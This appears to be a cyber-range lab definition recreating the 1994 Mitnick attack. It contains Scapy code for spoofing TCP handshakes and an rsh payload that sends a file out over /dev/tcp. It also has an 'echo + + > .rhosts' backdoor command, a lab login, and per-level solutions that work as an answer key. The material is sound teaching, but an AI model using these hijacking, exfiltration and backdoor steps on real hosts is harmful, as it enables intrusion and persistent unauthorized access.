title: The Mitnick Attack
description: A hands-on recreation of the 1994 Mitnick attack: blind TCP session hijacking against a trusted-host (rsh) relationship, based on the SEED Labs 'Mitnick Attack Lab'.
outcomes: You will understand why unauthenticated, IP-based trust (rsh/.rhosts) is exploitable.
You will understand blind TCP session hijacking: ISN prediction/observation, SYN flooding to silence a trusted host, and spoofed handshake completion.
You will write a sniff-and-spoof program with Scapy that forges a TCP connection on someone else's behalf.

levels.title: Briefing
levels.content:
# Please read before you start

* Submitting a level's solution **reveals it** for the rest of your group — the levels build directly on each other, so do not reveal ahead of where you actually are.
* This game recreates the real 1994 attack against Tsutomu Shimomura's machines, using the SEED Labs 20.04 'Mitnick Attack Lab' (Wenliang Du). It is for educational use only; launching this kind of attack against systems you do not own or have written permission to test is illegal.

# Scenario

In 1994, two of Shimomura's machines trusted each other: **X-Terminal** would accept a remote shell (`rsh`) from the **Trusted Server** without asking for a password, because at the time TCP sequence numbers were predictable and nobody checked more than the source IP address.

You are Mitnick. You have a shell on a third machine, the **Attacker**, sitting on the same network as the other two. Your goal: without ever having valid credentials on X-Terminal, get it to run a command on your behalf by impersonating the Trusted Server — and then leave yourself a permanent backdoor so you never have to repeat the attack.

All three machines live inside one VM as Docker containers on a shared internal network, `10.9.0.0/24` — exactly as in the original SEED Lab manual. Once you are in, `dockps` lists the running containers and `docksh <id>` drops you into one.

levels.title: Get Access
levels.cloud_content:
Access the sandbox, then submit **`start`**.

### Sandbox access
1. In the topology overview, right-click **`seed-vm`** → **Open GUI**, or use SSH (see [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access)).
2. Log in as **`user`** / **`Password123`**.
3. Run `dockps` to confirm three containers are already up: `xterminal-10.9.0.5`, `trustedserver-10.9.0.6`, and `attacker`.
4. `docksh <id>` into the **attacker** container. You will do everything from here — you never need, and never get, a shell on X-Terminal or the Trusted Server.
levels.local_content: This sandbox has not been tested for use with a local sandbox.

levels.title: Recon: the trust relationship
levels.content:
From the **attacker** container, scan both other hosts (`nmap 10.9.0.5`, `nmap 10.9.0.6`). Both run the old BSD remote-shell service, `rshd` — the same service that let Shimomura log into X-Terminal from the Trusted Server with no password, via a `.rhosts` entry on X-Terminal.

The flag is the TCP port that `rshd` listens on.
levels.solution:
```
user@attacker:~# nmap 10.9.0.5
PORT    STATE SERVICE
514/tcp open  shell

user@attacker:~# nmap 10.9.0.6
PORT    STATE SERVICE
514/tcp open  shell
```
The flag is `514`.

hints.title: Which service name shows up?
hints.content: nmap labels port 514/tcp as `shell` — that's the BSD `rsh` protocol's listening port.

levels.title: Confirm the Trusted Server is silenced
levels.content:
In the real attack, Mitnick first had to **silence** the Trusted Server with a SYN-flood, so that when X-Terminal later replies to a connection the Trusted Server never actually asked for, the Trusted Server's own kernel doesn't just send a RST and kill it. That silencing has already been simulated for you in this sandbox (the Trusted Server drops unsolicited inbound SYN+ACK packets at the firewall level) — your job in this level is to *prove it*, the way Mitnick would have needed to before trusting the rest of the attack.

From the **attacker** container:
1. Start a capture: `tcpdump -i <bridge-iface> -n host 10.9.0.5` (find the right bridge interface with `ip a` or `brctl show` — look for the one carrying `10.9.0.0/24` traffic; plain `eth0` inside the container will not see it, you need the bridge device itself).
2. Using Scapy, send a single spoofed SYN packet to X-Terminal:10.9.0.5 port 514, with the source IP address set to the Trusted Server's address (10.9.0.6) and source port 1023 (this is the fixed source port `rsh` clients use — using a different one causes `rshd` to reset the connection later).
3. Watch your capture. X-Terminal will reply — and nothing will reset the connection, because the Trusted Server never sees that reply.

The flag is the two-letter Scapy flag string (e.g. `"S"`, `"SA"`, `"R"`) set on the packet X-Terminal sends back.
levels.solution:
```python
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=1023, dport=514, flags="S", seq=1000)
send(ip/tcp)
```
Captured reply: `10.9.0.5:514 -> 10.9.0.6:1023 [SYN, ACK]` — flags `SA`. No RST ever follows, because the Trusted Server is silenced and never sees its own SYN+ACK.

hints.title: Which interface do I sniff on?
hints.content: Not `eth0`. Find the Docker bridge device for the `10.9.0.0/24` network with `ip a` and capture on that.

hints.title: What source port?
hints.content: Source port must be `1023` — that's what real `rsh` clients use, and it's what X-Terminal/rshd expects later in the attack.

hints.title: What am I looking for?
hints.content: You're checking the TCP flags field on the packet X-Terminal sends in response to your spoofed SYN.

levels.title: Hijack the connection
levels.content:
Now do it for real. An `rsh` session is actually **two** TCP connections: the first (client → `rshd` on port 514) carries the authentication data and the command; the second (server → client, on a port the client chose) is for error output, and `rshd` refuses to run anything unless it is also established.

**Restriction** (this is graded on your code, not just the final flag): you may only act on information a real off-path attacker could get. From any packet you sniff, you may use:
* the TCP **sequence number** field (never the acknowledgment field — you never legitimately see what the Trusted Server received),
* the TCP **flags** field,
* length fields (IP header length, IP total length, TCP header length).

Templates are in `/volumes/` inside the attacker container: `conn1_spoof.py` and `conn2_spoof.py`. Finish them:

1. **Connection 1** (`conn1_spoof.py`): spoof a SYN from the Trusted Server (10.9.0.6:1023) to X-Terminal (10.9.0.5:514). Sniff X-Terminal's SYN+ACK to read its sequence number, then spoof the ACK that completes the handshake. Immediately after, send the rsh data payload:
   `"<port>\x00seed\x00seed\x00cat flag_hijack.txt > /dev/tcp/10.9.0.6/<port>\x00"`
   — pick a port (e.g. `9090`) for the second connection and use it consistently in both scripts.
2. **Connection 2** (`conn2_spoof.py`): X-Terminal will now try to open a second connection to the Trusted Server on the port you chose. Sniff the SYN, spoof the matching SYN+ACK as if you were the Trusted Server.
3. Run `conn2_spoof.py` first (it needs to be listening before X-Terminal's command executes), then `conn1_spoof.py`.
4. If both connections complete, X-Terminal runs your command and pipes `flag_hijack.txt`'s contents back over the first connection — watch for it in your capture.

The flag is the exact content of `flag_hijack.txt`, which you just read off the wire without ever logging into X-Terminal.
levels.solution: Completing `conn1_spoof.py`'s `spoof()` handler: on seeing X-Terminal's `SA` packet, send `IP(src="10.9.0.6",dst="10.9.0.5")/TCP(sport=1023,dport=514,flags="A",seq=<your_syn_seq>+1,ack=<their_seq>+1)`, then immediately `send(ip/tcp/rsh_data)` with the 4-field rsh payload. `conn2_spoof.py` mirrors this for the second connection, replying `SA` to X-Terminal's `SYN` on the chosen port. Once both connections exist, `rshd` on X-Terminal runs the `cat` command and the flag streams back over connection 1, visible in `tcpdump`/Wireshark.

hints.title: Order of operations
hints.content: Start `conn2_spoof.py` before `conn1_spoof.py` — X-Terminal opens the second connection only after it receives your first rsh data packet, and `rshd` will give up if nothing answers it in time.

hints.title: What goes wrong if my ACK's sequence number is off by one?
hints.content: The acknowledgment number in your spoofed ACK must be exactly (X-Terminal's SYN+ACK sequence number) + 1 — same off-by-one rule as a normal handshake.

hints.title: rsh data format
hints.content: Four `\x00`-separated fields, in order: the port for connection 2, the client user ID, the server user ID, the command — with a trailing `\x00`.

hints.title: Source port for connection 1
hints.content: Must be exactly `1023`, or `rshd` resets the session right after you think you've succeeded.

hints.title: I don't see the flag come back
hints.content: Check you're sniffing the right bridge interface and that `conn2_spoof.py` is already running and listening before `conn1_spoof.py` sends the rsh data.

levels.title: Plant the backdoor
levels.content:
Repeating that whole attack every time would be exhausting. Mitnick didn't — he planted a backdoor on his first visit.

`rshd` trusts any host listed in a user's `.rhosts` file. Putting the two characters `+ +` in it means *trust everyone, no password, ever*.

Re-run the attack from the previous level, but replace the command in your rsh data with:
```
echo + + > .rhosts
```
(run it as the `seed` user's home directory is where `rshd` looks). Once it succeeds, you no longer need the Attacker's spoofing scripts at all — `rsh 10.9.0.5 cat flag_backdoor.txt` from the attacker container should now work with no password, because X-Terminal will trust a request from *anyone*.

The flag is the content of `flag_backdoor.txt`, retrieved via your new backdoor.
levels.solution:
```
user@attacker:~# rsh 10.9.0.5 cat flag_backdoor.txt
```
works with no password prompt, because X-Terminal's `.rhosts` now contains `+ +`.

hints.title: Where does `.rhosts` need to end up?
hints.content: The home directory of the `seed` user on X-Terminal — same place the original trust entry for the Trusted Server already lived.

hints.title: Do I need the spoofing scripts again after this?
hints.content: No — once `+ +` is in `.rhosts`, plain `rsh 10.9.0.5 <command>` from the attacker container works directly, no spoofing needed.
